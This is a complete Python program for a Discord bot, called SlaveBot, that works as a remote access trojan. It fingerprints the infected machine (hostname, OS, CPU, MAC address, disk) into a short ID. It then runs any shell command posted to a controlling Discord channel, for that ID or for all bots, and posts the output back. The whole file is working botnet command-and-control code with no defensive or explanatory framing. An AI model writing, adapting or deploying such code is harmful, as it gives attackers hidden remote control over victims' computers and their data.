import discord
import platform
import hashlib
import uuid
import psutil
import subprocess
from discord.ext import commands

# Configuration
TOKEN = "YOUR_DISCORD_BOT_TOKEN"
COMMAND_CHANNEL_ID = 1234567890  # Channel ID for receiving commands
RESPONSE_CHANNEL_ID = 1234567891  # Channel ID for sending responses

def get_system_id():
    # Collect system data
    info = {
        "hostname": platform.node(),
        "os": f"{platform.system()} {platform.release()}",
        "cpu": platform.processor(),
        "mac": ":".join(["{:02x}".format((uuid.getnode() >> ele) & 0xff) for ele in range(0,8*6,8)][::-1]),
        "disk": psutil.disk_partitions()[0].device if psutil.disk_partitions() else "N/A"
    }
    # Generate unique hash
    unique_str = "-".join(str(v) for v in info.values()).encode()
    return hashlib.sha256(unique_str).hexdigest()[:8]

class SlaveBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(command_prefix="!", intents=intents)
        self.system_id = get_system_id()

    async def on_ready(self):
        print(f"Slave {self.system_id} connected as {self.user}")

    async def on_message(self, message):
        if message.channel.id != COMMAND_CHANNEL_ID or message.author == self.user:
            return

        # Command format: "[ID] [COMMAND]"
        parts = message.content.split(maxsplit=1)
        if len(parts) < 2:
            return

        target_id, cmd = parts
        if target_id not in [self.system_id, "*"]:
            return

        # Execute command
        try:
            result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=30)
            output = result.decode()
        except Exception as e:
            output = str(e)

        # Send response
        response_channel = self.get_channel(RESPONSE_CHANNEL_ID)
        await response_channel.send(f"**{self.system_id}**\n```{output[:1900]}```")

if __name__ == "__main__":
    bot = SlaveBot()
    bot.run(TOKEN)
